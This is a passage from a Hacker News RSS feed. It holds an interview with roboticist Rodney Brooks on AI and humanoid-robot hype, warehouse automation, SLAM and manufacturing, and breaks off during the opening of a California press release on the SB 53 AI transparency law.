&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45416080</guid><pubDate>Mon, 29 Sep 2025 17:00:42 +0000</pubDate></item><item><title>Claude Code 2.0</title><link>https://www.npmjs.com/package/@anthropic-ai/claude-code</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45416228</guid><pubDate>Mon, 29 Sep 2025 17:12:13 +0000</pubDate></item><item><title>iRobot Founder: Don't Believe the AI and Robotics Hype</title><link>https://crazystupidtech.com/2025/09/29/irobot-founder-dont-believe-the-ai-robotics-hype/</link><description>&lt;doc fingerprint="7f2191553fe385b5"&gt;
  &lt;main&gt;
    &lt;p&gt;Every so often, we find ourselves in the middle of a massive technological wave that starts to upend our presumptions and our ideas about the past, present, and future. These waves come with excess—optimism, excitement, hype, and speculation. Since non-believers don’t invent the future and speculators are always on a hustle, I often turn to practitioners to get a fix on the coordinates of reality. It has always helped me maintain a sense of pragmatic optimism when the rest of the world around me seems either overtly hyperbolic or depressingly pessimistic.&lt;/p&gt;
    &lt;p&gt;We are in the middle of another massive technological wave, thanks to generative artificial intelligence and its offshoot, robotics. A tanker load of money is being poured into these two areas, and it has come with increasingly breathless promotional activity. It warrants a reality check. For that, I turned to Rodney Brooks, who has spent decades in both arenas. The Australian-born Brooks was a Professor of Robotics at MIT and former director of the MIT Computer Science and Artificial Intelligence Laboratory. He has founded three companies: iRobot (maker of the Roomba), Rethink Robotics, and now Robust.AI, which now builds warehouse automation robots. He is an academic who entered the startup arena and hasn’t left it since.&lt;/p&gt;
    &lt;p&gt;We recently connected for a conversation about robotics, artificial intelligence, and the future. Contrary to many, he believes humans will do just fine in a world filled with robots and AI. He poured cold water on the humanoid robot hype. He also said that if you look at the computer and internet revolutions, the AI revolution is going to take a lot longer than most think. “There’s a tendency to go for the flashy demo. But the flashy demo doesn’t deal with the real environment. It’s going to have to operate in—the messy reality. That’s why it takes so long for these technologies,” he said. He painted a more pragmatic yet optimistic vision ahead. He warned that humanoid hype is creating a lot of false expectations. Excerpts from our conversation.&lt;/p&gt;
    &lt;p&gt;Om: You have a rare quality as a science person to write about tech in an understandable fashion. I think it’s always helpful to think beyond the tech directly and consider what the consequences are. When I hear people talk about AGI taking over, I point out that we have already become machine-idiots. We just follow the machine blindly.&lt;/p&gt;
    &lt;p&gt;You wrote something about Waymo recently, where you said there is not really full self-driving because there is human intervention. I would argue it’s not even the best human intervention. Waymo dropped me off at a completely different location, even though on the map it showed the right location.&lt;/p&gt;
    &lt;p&gt;Rodney: At MIT, I taught big classes with lots of students, so maybe that helped. I came here in an Uber this morning and asked the guy what street we were on. He had no clue. He said, “I just follow it.” (‘It’ being the GPS—Ed.) And that’s the issue—there’s human intervention, but people can’t figure out how to help when things go wrong.&lt;/p&gt;
    &lt;p&gt;Om: We are now Machine Idiots. So what are you working on now?&lt;/p&gt;
    &lt;p&gt;Rodney: My new company is putting smart carts in fulfillment warehouses. It doesn’t sound like much, but in fulfillment, many people work picking orders and shipping them out. There are enormous warehouses everywhere full of human workers because human hands are just so much better than anything else. They’re picking, putting orders in totes in these carts, and pushing the carts around.&lt;/p&gt;
    &lt;p&gt;We’ve got this cart called Carta that has cameras. It knows where it is, goes to the right place, and helps people figure out where the item they want is. It doesn’t do the grasping—people do the picking.&lt;/p&gt;
    &lt;p&gt;The big thing we do is reduce the amount of walking people have to do. In these warehouses, a typical number of steps per day for a person is 30,000. Now we all know what 10,000 steps feels like (it’s about 5 miles), so imagine doing 30,000 steps a day. It’s really hard on people’s bodies.&lt;/p&gt;
    &lt;p&gt;When they finish a pick-tour, instead of walking back and pushing a heavy cart 400 feet, they just say ‘done,’ and the robot goes off and takes the items to the correct location. We have affordances on the cart that lower the cognitive load. (Affordance is an action humans can easily perceive—Ed.)&lt;/p&gt;
    &lt;p&gt;In comparison, the state of the art is that people have scan guns, and on their wrists are tiny screens with character-based software—it’s ’80s or ’90s technology emulated on an Android device. They have to read that to know what bin number, what thing to do.&lt;/p&gt;
    &lt;p&gt;Om: How does this company relate to all the companies you’ve started?&lt;/p&gt;
    &lt;p&gt;Rodney: My companies have always been about letting the person still have control. The previous one, Rethink Robotics, involved people showing the robot what to do. The Roomba had a handle; if it got stuck, you could pick it up and move it. If a human grabs the Carta cart, they’re now in charge. If you grab its magic handlebar, you are like Superman—you move your hand a little, and it amplifies what you’re doing. We make the floor worker take control and put it in the right place without much physical effort.&lt;/p&gt;
    &lt;p&gt;The cart knows a ladder and knows not to go near ladders because a person is up there—if it hit one, it would be disastrous. If it’s going down an aisle and there’s a person there, it’s polite, waits for the person to move, tries to go around them. But if a pallet is blocking the aisle, it recognizes that it’s not going to move by itself. There’s no point waiting. It turns around and tells the central system that this aisle is blocked. It’s simple intelligence, which is what we can do today and make reliable. It’s not sexy. It’s technology in the service of making things easier for workers and more efficient.&lt;/p&gt;
    &lt;p&gt;Om: You’re building a product which is simpler, unsexy, but when I think about the Roomba and all the companies you’ve done in the past, they have always made things very futuristic—like some robot is cleaning my house. Whereas now we’re in the phase of automation where we almost take robots for granted as humans, even though you’re solving problems like those robots inside Amazon’s warehouse.&lt;/p&gt;
    &lt;p&gt;Rodney: Amazon has automated and manual warehouses. We’re trying to put technology in the manual warehouses, whether it’s DHL—our biggest customer—or Amazon. It’s about putting robots in places where there are no robots. And it’s not saying it’s a humanoid that’s going to do everything.&lt;/p&gt;
    &lt;p&gt;You’re right, it’s not sexy. And you know what that means for me? It’s hard to raise money. “Why aren’t you doing something sexy?” the VCs ask. But this is a $4 trillion market that will be there for decades.&lt;/p&gt;
    &lt;p&gt;Om: It’s much easier to fund the promise than a real business, because real businesses have limitations on how fast they can grow. Whereas if you don’t know, you can live (and fund) the dream. There’s nothing wrong with living the dream—that’s how you get to fund crazy things in this industry. But people doing more rational things do pay the price.&lt;/p&gt;
    &lt;p&gt;You’ve been in robotics for a long time. There are misconceptions about robots and robotics. The biggest fallacy is that we think of them in human form. Ten years later, that idea of a humanoid has become so pervasive. We don’t think about things that do robotic tasks, like ad systems that serve ads constantly—they are also robots.&lt;/p&gt;
    &lt;p&gt;Rodney: The robots—they’re not embodied. I always say about a physical robot, the physical appearance makes a promise about what it can do. The Roomba was this little disc on the floor. It didn’t promise much—you saw it and thought, that’s not going to clean the windows. But you can imagine it cleaning the floor. But the human form sort of promises it can do anything a human can. And that’s why it’s so attractive to people—it’s selling a promise that is amazing.&lt;/p&gt;
    &lt;p&gt;Om: What do you think about the current state of robotics in the US versus how people are funding robots and thinking about them?&lt;/p&gt;
    &lt;p&gt;Rodney: There’s good news and bad news. The amount of processing power we have now is amazing—amounts of computation and small sensors largely driven by the phone market.&lt;/p&gt;
    &lt;p&gt;With my company, the motors we use are hub motors from electric scooters because they are made in the millions. They’re cheap and much better than the motors you could buy 10 years ago at a much lower price. So instead of building custom motors, we ride that curve.&lt;/p&gt;
    &lt;p&gt;Likewise with GPUs—I think Nvidia is the luckiest company in the world. They were building graphics processing units and they turned out to be able to do the computation of neural networks. The GPUs are great for the vision computations you need to localize, to know where you are—SLAM, simultaneous localization and mapping.&lt;/p&gt;
    &lt;p&gt;You can do so much more computation, sensing, some actuation, but people underestimate the long tail of the natural environment. That’s what we see with autonomous vehicles. I first attended a talk on autonomous vehicles in 1979 in Tokyo. By 1990, Ernst Dickmanns in Germany had his truck driving on the Autobahn at 100 kilometers an hour. He took it to Paris, and an autonomous vehicle drove around Paris in 1990. Then in 2007, 2008, people saw the DARPA autonomous vehicle and said, “Oh, it’s going to be everywhere instantly.” But it’s taken almost 20 years, and it’s still only in little tiny geographical areas because of the long tail of all the things that can happen.&lt;/p&gt;
    &lt;p&gt;There’s a tendency to go for the flashy demo, but the flashy demo doesn’t deal with the real environment. It’s going to have to operate in the messy reality. That’s why it takes so long for these technologies.&lt;/p&gt;
    &lt;p&gt;Om: Like Waymo—they still require human intervention.&lt;/p&gt;
    &lt;p&gt;Rodney: That’s why I’m skeptical of the Tesla taxi system. At the last earnings call, Elon said they’re going to have safety drivers in the Teslas and they’re hiring remote drivers. It’s sort of a charade.&lt;/p&gt;
    &lt;p&gt;Om: There is a habit in our modern society to forget how long it takes for something to actually find its true form, like PCs. I remember using MS-DOS, then eventually where we are today where we don’t even think about what the PC looks like. The same with smartphones—I used the earliest examples from Nokia and Palm and then eventually seeing where we are today. There is a way to minimize the effort needed for technology to find its perfect form, but that’s going to be a challenge for self-driving as well.&lt;/p&gt;
    &lt;p&gt;Rodney: It’ll take a long time for adoption.&lt;/p&gt;
    &lt;p&gt;Om: You did early work on mapping and (Simultaneous Localization and Mapping) SLAM about 40 years ago. When you were thinking about that future, how were you thinking about it?&lt;/p&gt;
    &lt;p&gt;Rodney: The SLAM paper was released in 1985. I was working on mobile robots, and Waymos are mobile robots. It never occurred to me that there would be, in my lifetime, the level of Waymos we have, even though it’s not where people think it is. I was just wanting to get mobile robots that could move around and do things in the world, and they had to know where they were and how to get somewhere. That was the problem I was solving—just the next few steps.&lt;/p&gt;
    &lt;p&gt;Around the same time, I wrote some whimsical things about home cleaning robots, mixing nanotechnology with robotics. I talked about lots of little robots living on your floor, picking up stuff and putting it in a pile for the big robot to come and suck up the dirt—societies of robots around us, which was a science fiction thing that has not happened.&lt;/p&gt;
    &lt;p&gt;Om: What was the genesis of your fascination with robots?&lt;/p&gt;
    &lt;p&gt;Rodney: I grew up in a working-class environment. My parents didn’t come close to finishing high school. Somehow I just won the genetic lottery. I was born in the ’50s, a white male in an English-speaking country, which turned out to be really important. But on top of that, I had mathematical ability that was so obvious that by the time I was four, my parents referred to me as “the professor.”&lt;/p&gt;
    &lt;p&gt;My parents found these How and Why Wonder books—one on electricity and one on computers and giant brains. The publication date is 1961. I probably got them when I was seven. I read these books, learned how to make circuits out of stuff I had—wires, nails, batteries, flashlight bulbs. The computers had pictures of imagined robots and explained binary systems, so I learned how to build circuits and then saw how to build little bits of computation. I was always trying to build computers for the rest of my childhood because there were no computers available. I tried building robotic devices but wasn’t really good at mechanisms, so I really wanted to build robots.&lt;/p&gt;
    &lt;p&gt;Om: Where did you grow up?&lt;/p&gt;
    &lt;p&gt;Rodney: Adelaide, South Australia.&lt;/p&gt;
    &lt;p&gt;Om: Still a fan of cricket?&lt;/p&gt;
    &lt;p&gt;Rodney: Here’s my superpower. When I was eight years old, Ian and Greg Chappell coached me when I was a child. It did me zero good—I was so bad. But as far as all my countrymen are concerned, they think I am the luckiest guy on the planet. (The Chappell brothers – Ian and Greg are legends of the game of cricket, much like the baseball legends, the DiMaggio brothers.)&lt;/p&gt;
    &lt;p&gt;Om: When you look at that SLAM paper you wrote, what has been the big lesson of turning something on paper into reality?&lt;/p&gt;
    &lt;p&gt;Rodney: All these things require so much more engineering than some initial idea. My initial idea was loop closing, which is critical to SLAM. But my version of merging observations probabilistically was actually quite terrible. In 1985, someone else who read the paper published a paper a year later to improve on that part. Then other people started to see little pieces—”Oh, I can improve here, I can improve there.” During the ’90s, there were hundreds of papers every year coming out on SLAM. It was a hot topic, and people realized it was going to be important for getting moving robots into environments.&lt;/p&gt;
    &lt;p&gt;Even now, it’s only in the last five years that we’ve been able to do it with computer vision because we didn’t have enough computational power. Up until recently, it was all LIDAR-based. So technologies wait for other technologies to come along. The computer vision wasn’t driven by that, but then it got good enough to do it. Some things might be a good idea, and you can see how it could work, but it may require so many side technologies that you haven’t worked through all the details to make it practical. That could be a long time.&lt;/p&gt;
    &lt;p&gt;Om: Knowing what you know, do you think we need to be rethinking how we approach innovation, education, and our perspective on the world? Forty years may have worked in the pre-network era, but now we live in a post-network world with new intensity and rhythm.&lt;/p&gt;
    &lt;p&gt;Rodney: There’s a new rhythm, and what I fear is that everyone jumps into new orthodoxies. For a few years now, people have been saying if you’re not working on neural net-based AI, you’re in the past, you’re a dinosaur. I guarantee there will be things that people have been working on for years that will become important and they’re not neural-based.&lt;/p&gt;
    &lt;p&gt;Om: You have very strong opinions about generative AI. When I talk to young people, I wonder if we have an entire society trained on an answer-based value metric—we read a book, get an answer, take an exam, give an answer. Whereas generative AI means we’re more question-oriented going forward. The ability to ask the right questions is going to separate us from being really good versus just average. You have to be someone special to be able to ask questions in philosophy and art and robotics and AI. Not everybody can connect the dots. So maybe there’s a whole new class of educational approaches that need to emerge.&lt;/p&gt;
    &lt;p&gt;Rodney: I think we need multiple education approaches and not put everything in the same bucket. I see this in Australia—”What’s your bachelor’s degree?” “I’m doing a bachelor’s degree in tourism management.” That’s not an intellectual pursuit, that’s job training, and we should make that distinction. The German system has had this for a long time—job training being a very big part of their education, but it’s not the same as their elite universities.&lt;/p&gt;
    &lt;p&gt;[ Brooks is right in pointing out that we are busy propping up an education system that creates work for an industrial and industrial-version of digital economies. Germans (and many other parts of the world) have this idea of diplomas in specialized trade skills, which is exactly how we are going to be thinking about in the future, because the idea of work, augmented by digitized automation, both robotic and software, will need to evolve. As such, we need to really rethink the entire map of employment and fine-tune “collegial output” in terms of jobs needed to be done in tandem with the emergence of rapid computerized automation. The United States is still trying to use the same template of education that it has for decades. –OM ]&lt;/p&gt;
    &lt;p&gt;Om: In India too, we had diplomas which were very targeted—if you wanted to work in a power station, you got a diploma.&lt;/p&gt;
    &lt;p&gt;Rodney: Australia too, diplomas for teaching primary school, which is honorable. But it’s not necessarily—although I wish, looking back at the history teaching I got, it didn’t teach me about the world because it was just regurgitating “this happened, that happened,” instead of why it happened, what were the intellectual ideas driving it.&lt;/p&gt;
    &lt;p&gt;Om: I struggled in college because I was always the one asking, “Why are we doing this experiment? What is the outcome? Why are we looking for this outcome?” We already know the answer—some scientist discovered it—but no one explains why we’re repeating it and what we gain from it as students.&lt;/p&gt;
    &lt;p&gt;Rodney: I remember undergraduates working in my lab at MIT. One guy who ended up being a professor would be doing stuff and then say, “That’s why they taught me that thing in that class, now I see what”—because the classes, even at MIT, didn’t necessarily connect why this question is interesting, why it’s important. Then through the practice of trying to build real things, “Oh, that’s what I needed to know.”&lt;/p&gt;
    &lt;p&gt;Om: I think of being a journalist as the best education I ever got, especially writing about tech, because I learned about microcontrollers, embedded operating systems, networks, switches, and compute. I also learned about the impact of all these technologies on real people and the real world. There’s no way any college could have taught me that. In this world, I was happier than in school because in school, I wasn’t able to connect the dots. In the real world, the dots were connecting in my brain.&lt;/p&gt;
    &lt;p&gt;I look at why I’m okay with all the generative AI stuff that has come to market—I know the right questions to ask. I know how to talk to ChatGPT. I’ve grown up interviewing people, so I know when the response is nonsense.&lt;/p&gt;
    &lt;p&gt;Rodney: Generative AI challenges us intellectually. John Searle at Berkeley talked about the Chinese Room argument. (It says that no matter how smart a computer seems, it can’t have human consciousness.–Ed) Well, the Chinese Room showed up. I recently gave an example. I used Google to give me a Chinese output for: “Who is Ai Weiwei?”&lt;/p&gt;
    &lt;p&gt;I cut and pasted those Chinese characters into ChatGPT, and it gave a biography of him. So there’s the Chinese room—I feed in symbols in Chinese and it feeds me back symbols in Chinese. Searle was saying the Chinese room is absurd because they could never understand Chinese just by symbol matching. And here it did it. So there’s a challenge to what it means to understand language.&lt;/p&gt;
    &lt;p&gt;There are these rules of language, and the only reason we can understand language is because of biological structures in our brain attuned to language. Here’s generative AI—did it have the universal grammar machine in it, yet it’s so adept at language. So that’s another challenge.&lt;/p&gt;
    &lt;p&gt;Generative AI challenges long-held notions of how things work. In the worst case, it says we’re not as smart as we think we are because this dumb thing can do what we do. We always have a view of ourselves as people being special. I remember when the human genome was decoded and we had fewer genes than a potato—people were outraged.&lt;/p&gt;
    &lt;p&gt;Om: More is more, right? More must be better.&lt;/p&gt;
    &lt;p&gt;Rodney: Through the history of mankind—the world is the center of the universe, the sun goes around it, God is up there looking at us. Then we discover other planets, other solar systems, other galaxies, and we’re one of billions of billions of planets. But we’re special! It gets people upset. I was at the World Economic Forum on stage talking about AI and being provocative. Yehudi Menuhin was in the audience and stood up and yelled at me for devaluing humans by talking about machine intelligence.&lt;/p&gt;
    &lt;p&gt;Om: If you stop thinking about generative AI as this road to AGI and think of it as simply a way to interact with information—&lt;/p&gt;
    &lt;p&gt;Rodney: That’s what I do take it as. If you’d explained it to me 15 years ago, I would have said, “There’s no way that can work.” So it’s a surprise that it works, but it is an encoding of information.&lt;/p&gt;
    &lt;p&gt;Om: What are you thinking about the future right now? How should we contextualize artificial intelligence and robotics? Do you want my really crazy stuff?&lt;/p&gt;
    &lt;p&gt;Rodney: If I look at history and history of ideas, we often get sucked in by the wrong idea. One of my examples is Sir Isaac Newton. Really smart dude—he invented calculus, figured out gravity and movement of bodies in 3D, did optics, split light into multiple colors. But he spent over half his life working on alchemy, trying to convert lead to gold. Really smart guy. Why did he do that? He thought, as everyone did, that it was chemical. They had primitive chemistry. He didn’t know about nuclear—the nucleus is what you have to deal with to convert lead to gold. Everyone thought it was the same kind of thing they were used to, burning stuff and mixing stuff. He had the wrong underlying model.&lt;/p&gt;
    &lt;p&gt;When Elon Musk decided he wanted to put stuff into orbit, he didn’t say, “I’ll write a Python script, and that will get stuff into orbit.” He had to figure out how to burn fuel efficiently, worry about mass, liquid flows, high temperatures, because you can write as big a program as you want, it’s not going to get stuff into orbit. Computation is not the stuff you need to physically move things.&lt;/p&gt;
    &lt;p&gt;Somehow, we’ve decided that computation is what happens in our brain. Is it really computation? And why is that?&lt;/p&gt;
    &lt;p&gt;Between 1945 and 1965, there were four disciplines that were of focus. You have this two-by-two chart of science, and engineering. And you have life and intelligence.&lt;/p&gt;
    &lt;p&gt;Over here we have neuroscience. Here we have AI. Here we have artificial life. And here we have abiogenesis—turning abiotic into biotic. These four modern computational disciplines all came into being 1945 to 1965. If you look at any two of them, I can show you someone who worked in those two fields. For any three of them, mostly I can find someone who worked in all three fields—von Neumann, McCulloch, a whole bunch of people.&lt;/p&gt;
    &lt;p&gt;Any of the four have taken computation as their primary metaphor. Abiogenesis is still chemical, not computational. But why are any of these computational? Is that the right stuff?&lt;/p&gt;
    &lt;p&gt;Or are we trying to build a rocket by writing a program, which is doomed to failure? In the same way, Newton was doomed to failure with alchemy because it’s not chemical—it’s nuclear, and no one knew about the nucleus. So that’s my bigger picture. AGI could be 300 years away because we’re dealing in the wrong kind of stuff.&lt;/p&gt;
    &lt;p&gt;Om: I am trying to figure out what AGI is.&lt;/p&gt;
    &lt;p&gt;Rodney: Building a machine which could do all the things we do with our brain. It may be something that we haven’t even thought about.&lt;/p&gt;
    &lt;p&gt;There’s this assumption of the infinite power of the human mind. I like to think about orcas. Orcas are really smart, really brutal, as we are. There’s great footage where they’re going after seals up on rocks, but they’ve got to sneak up on them in shallow water, so they roll over at 90 degrees so their dorsal fin doesn’t show above water. So they’re solving problems. They have some self-model.&lt;/p&gt;
    &lt;p&gt;But we never think they’re going to build a foundry and start smelting metal. We don’t think they’re smart enough, but we think we’re infinitely smart and we’ll solve all these problems with technology. Just like the orcas, we may have limits and we don’t like that.&lt;/p&gt;
    &lt;p&gt;Om: But humans do solve problems. And look how far we’ve come.&lt;/p&gt;
    &lt;p&gt;Rodney: We’ve come so far compared to orcas, but orcas can only come so far. Maybe there’s a natural limit for us.&lt;/p&gt;
    &lt;p&gt;Om: But what I was trying to say is that we have entered a new reality. The world existed pre-internet and post-internet. It was not creating digital data at the speed we generate now, so we need new tools to deal with this reality.&lt;/p&gt;
    &lt;p&gt;Rodney: I agree with you, but I think that’s the pedestrian part of our existence.&lt;/p&gt;
    &lt;p&gt;Om: I find it more exciting because it’s going to be more disruptive than this idea of AGI. We have all this money going into robots, humanoid robots, and other AI, but we don’t have manufacturing in this country. We don’t make anything. When I look at what China is doing with their EVs or their self-driving cars, they’re building new cities with roads that have sensors—essentially built for this new reality. I feel we are not thinking about the opportunities correctly because the Chinese have the end market for manufacturing. They are very good at manufacturing—that’s what they’ve been doing for the last 25 years.&lt;/p&gt;
    &lt;p&gt;Rodney: I started manufacturing in China in the late ’90s. Just last week, my company put out a press release that Foxconn is going to build our robots at scale. They’re based in Taiwan, but it’s undeniable—if you want to do something at scale, that’s how you have to do it.&lt;/p&gt;
    &lt;p&gt;But let’s look ahead to this century. Fifty years from now, all the innovation is going to be happening in Nigeria. They’re going to be such a big part of the world population, and they’re going to have so many problems they have to deal with, and they will deal with them. Nigeria is going to be the center of the technological universe by the end of this century. (Just as China and its large population, and its need to solve its problems made it into an economic powerhouse, Brooks believes the sheer size of Nigeria is going to make it an economic and technological epicenter.–Ed)&lt;/p&gt;
    &lt;p&gt;Om: How are we going to have all these companies build robots in the U.S.? What will be our manufacturing? What will be our place in this world? What do we think about the American future in manufacturing? Do we think about a post-capitalist future where scale is not what we think about? How does the world change?&lt;/p&gt;
    &lt;p&gt;Rodney: Will manufacturing be driven by 3D printing? It’s not yet. We’re starting to use 3D printing for components of machines. Electron (a New Zealand company) that launches satellites from New Zealand—they 3D print their rocket motors. But they can afford to do that because it’s such a high-value thing. As 3D printing becomes more general, in the same way information technology and payment systems got adopted in the third world more quickly than in the US, 3D printing will become the engine of manufacturing.&lt;/p&gt;
    &lt;p&gt;Right now, the supply chain is the reason China is so effective. Chinese manufacturing companies realized they had to diversify and started building supply chains in places like Malaysia, Vietnam. But if 3D printing really gets to be effective, the supply chain becomes all about raw materials that get poured into the front of those 3D printers. It’ll be about certain chemicals, about raw materials, because then every item would ultimately be 3D printed. That completely breaks the dynamic of what made Chinese manufacturing so strong—the supply chain of components.&lt;/p&gt;
    &lt;p&gt;Om: But then that flies in the face of manufacturing jobs being the savior of any economy.&lt;/p&gt;
    &lt;p&gt;Rodney: I was at a Brown University commencement giving a talk. And we were bemoaning the loss of US manufacturing. I asked the parents of the about to be Brown graduates—do who wants your kids to work in a factory? Oh no, not us! The poor people need the jobs, not my child. Who aspires that their kid is going to work at the sewage company? This bemoaning of manufacturing being lost is a little duplicitous—it’s not for us, it’s for the poor people.&lt;/p&gt;
    &lt;p&gt;OM: Manufacturing jobs are like a political hot potato. Politicians love to talk about manufacturing jobs as it wins votes. If you believe in the robotic revolution and 3D printing, things are going to be very different 25 years from now. I recently saw a video of BYD’s new factory in China. It is supposed to be as big as the city of San Francisco and it will have only 40,000 people making cars. The rest are all BYD-made robots. That’s the future of manufacturing at scale. This is very counter to the idea of “manufacturing jobs” as politicians like to talk about it.&lt;/p&gt;
    &lt;p&gt;Rodney: That’s why I brought up 3D printing. There’ll be other technologies that come in, not just robotics. One of the most interesting things is applying AI to creating materials—you can make predictions about what material properties will be and you don’t have to laboriously make each material and test it. As materials change, there’s 3D printing, changes in materials, a whole bunch of things that can come together. My answer is I don’t know, but I know it’s going to be different.&lt;/p&gt;
    &lt;p&gt;Om: Before you go, how should we correctly think about robotics and AI. Right now there is a hype way of thinking about it, there is a negative way of thinking about it. What is the right way?&lt;/p&gt;
    &lt;p&gt;Rodney: The right way of thinking about it is that appearance alone is not everything. There are things that are incredibly hard for us to do with technology at the moment, which we just don’t know how to do. So many of the promises of the hype of robotics and AI gloss over things we don’t know how to do well. We do not know how to manipulate things with robot hands. Everyone is excited about a robot hand, and Chinese companies are making the same mistake, thinking that it’s dexterous.&lt;/p&gt;
    &lt;p&gt;But the way that we do stuff with our hands, we have no way of reproducing, nor should we think that hands should be five-fingered. When this first structure appeared in animals, it was the first creatures that crawled out of the ocean onto the land. They had five bones to make pads that could be pushed around. This is an accident of evolution. Maybe in the future, the dexterous things will look more like sea anemones, lots of tentacles filled with cilia and they just pour stuff in and it gets manipulated.&lt;/p&gt;
    &lt;p&gt;I think the correct thing is not to think about it as being a duplication of humans. It’s never a duplication of humans that is the optimal solution or the most cost-effective solution. So it will be different from humans.&lt;/p&gt;
    &lt;p&gt;Om: You’ve said something about quantum computing having an impact and materials and physics.&lt;/p&gt;
    &lt;p&gt;Rodney: The effective quantum computers for the next 10 years are going to be using quantum computers to simulate physical systems, not doing classical computation way better. That’s still a long way off. I used to make the joke, people would ask me, “When are we going to get quantum computers?” And I would say, “I don’t know, but I’m pretty sure they’re going to be fusion powered.” Now we’re starting to see a diversity of approaches to fusion. Never say never, but for the next few years quantum computers are going to be much more about simulating physical systems.&lt;/p&gt;
    &lt;p&gt;Om: If you were to describe yourself right now, would you describe yourself as an optimist about AI or maybe not so much?&lt;/p&gt;
    &lt;p&gt;Rodney: I model myself as a realist. I’ve lived through so many hype cycles in AI. They weren’t as big in public as this one, but they were brutal amongst AI practitioners. The arguments were strong and deeply held—screaming matches would happen. I’ve seen that happen again and again. Neural is ascendant at the moment, but neural was ascendant four or five times before and then got crushed. Something else took over, came back.&lt;/p&gt;
    &lt;p&gt;You can see that in agentic AI. Now suddenly everyone’s got agent-based AI. They didn’t have it six months ago. I suspect it’s a little more marketing than reality. But when was the first paper on agentic AI published? It was in 1959 by Oliver Selfridge. There’s been agent-based systems—SOAR, there’s been lots. They come and go, all these ideas, and they get improved every time they come back. I’m not saying it’s stupid, I’m just saying as someone who’s been involved, it is not just the shiny new thing. This thing that looks shiny now may not be so shiny in a few years.&lt;/p&gt;
    &lt;p&gt;Om: But when I think about it, I feel that the amount of money being poured into this sector is going to have an impact. It’s going to push things along much faster.&lt;/p&gt;
    &lt;p&gt;Rodney: It’s going to have an impact and a lot of it will be wasted too.&lt;/p&gt;
    &lt;p&gt;Om: The networks were overbuilt and then that allowed a company like Google to come in and build out its own network and offer search so cheaply.&lt;/p&gt;
    &lt;p&gt;Rodney: There is an upside. Let me tell you my upside version—thinking of how to use all these data centers once the crash comes in training generative AI models. There will be so much competition in these data centers, just sitting there waiting to be used. I’m not going to use it to mine bitcoin, but smart people would be thinking beyond the crash of how to use—as you said, the networks were there, they were overbuilt, they were ready. So I think these data centers are getting overbuilt. They’ll be ready to be used for something new. If you can figure out how to do that, if some kid can figure out how to do that, they’re going to be working right now on it in obscurity and poverty and then boom.&lt;/p&gt;
    &lt;p&gt;Om: It would have been fun to keep talking, but I know we’ve gone over our time.&lt;/p&gt;
    &lt;p&gt;Rodney: Thank you for the conversation. It’s been stimulating to think through these ideas with someone who understands both the technical and broader implications.&lt;/p&gt;
    &lt;p&gt;Photo Credit: Christopher Michel.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45418261</guid><pubDate>Mon, 29 Sep 2025 20:19:08 +0000</pubDate></item><item><title>California governor signs AI transparency bill into law</title><link>https://www.gov.ca.gov/2025/09/29/governor-newsom-signs-sb-53-advancing-californias-world-leading-artificial-intelligence-industry/</link><description>&lt;doc fingerprint="bc1bc3194bbf906d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Governor Newsom signs SB 53, advancing California’s world-leading artificial intelligence industry&lt;/head&gt;
    &lt;p&gt;What you need to know: Governor Newsom today signed legislation further establishing California as a world leader in safe, secure, and trustworthy artificial intelligence, creating a new law that helps the state both boost innovation and protect public safety.&lt;/p&gt;
    &lt;p&gt;SACRAMENTO — Governor Newsom today signed into law Senate Bill 53, the Transparency in Frontier Artificial Intelligence Act (TFAIA), authored by Senator Scott Wiener (D-San Francisco) – legislation carefully designed to enhance online safety by installing commonsense guardrails on the development of frontier artificial intelligence models, helping build public trust while also continuing to spur innovation in these new technologies. The new law builds on recommendations from California’s first-in-the-nation report, called for by Governor Newsom and published earlier this year — and helps advance California’s position as a national leader in responsible and ethical AI, the world’s fourth-largest economy, the birthplace of new technology, and the top pipeline for tech talent.&lt;/p&gt;
    &lt;head rend="h4"&gt;“California has proven that we can establish regulations to protect our communities while also ensuring that the growing AI industry continues to thrive. This legislation strikes that balance. AI is the new frontier in innovation, and California is not only here for it – but stands strong as a national leader by enacting the first-in-the-nation frontier AI safety legislation that builds public trust as this emerging technology rapidly evolves.”&lt;/head&gt;
    &lt;p&gt;Governor Gavin Newsom&lt;/p&gt;
    &lt;p&gt;California works closely to foster tech leadership and create an environment where industry and talent thrive. The state is balancing its work to advance AI with commonsense laws to protect the public, embracing the technology to make our lives easier and make government more efficient, effective, and transparent. California’s leadership in the AI industry is helping to guide the world in the responsible implementation and use of this emerging technology.&lt;/p&gt;
    &lt;head rend="h4"&gt;“With a technology as transformative as AI, we have a responsibility to support that innovation while putting in place commonsense guardrails to understand and reduce risk. With this law, California is stepping up, once again, as a global leader on both technology innovation and safety. I’m grateful to the Governor for his leadership in convening the Joint California AI Policy Working Group, working with us to refine the legislation, and now signing it into law. His Administration’s partnership helped this groundbreaking legislation promote innovation and establish guardrails for trust, fairness, and accountability in the most remarkable new technology in many years.”&lt;/head&gt;
    &lt;p&gt;Senator Scott Wiener&lt;/p&gt;
    &lt;p&gt;Earlier this year, a group of world-leading AI academics and experts — convened at the request of Governor Newsom — released a first-in-the-nation report on sensible AI guardrails, based on an empirical, science-based analysis of the capabilities and attendant risks of frontier models. The report included recommendations on ensuring evidence-based policymaking, balancing the need for transparency with considerations such as security risks, and determining the appropriate level of regulation in this fast-evolving field. SB 53 is responsive to the recommendations in the report — and will help ensure California’s position as an AI leader. This legislation is particularly important given the failure of the federal government to enact comprehensive, sensible AI policy. SB 53 fills this gap and presents a model for the nation to follow.&lt;/p&gt;
    &lt;head rend="h4"&gt;“Last year Governor Newsom called upon us to study how California should properly approach frontier artificial intelligence development. The Transparency in Frontier Artificial Intelligence Act (TFAIA) moves us towards the transparency and ‘trust but verify’ policy principles outlined in our report. As artificial intelligence continues its long journey of development, more frontier breakthroughs will occur. AI policy should continue emphasizing thoughtful scientific review and keeping America at the forefront of technology.”&lt;/head&gt;
    &lt;p&gt;Mariano-Florentino (Tino) Cuéllar&lt;lb/&gt;Former California Supreme Court Justice and former member of National Academy of Sciences Committee on the Social and Ethical Implications of Computing Research&lt;/p&gt;
    &lt;p&gt;Dr. Fei-Fei Li&lt;lb/&gt;Co-Director, Stanford Institute for Human-Centered Artificial Intelligence&lt;/p&gt;
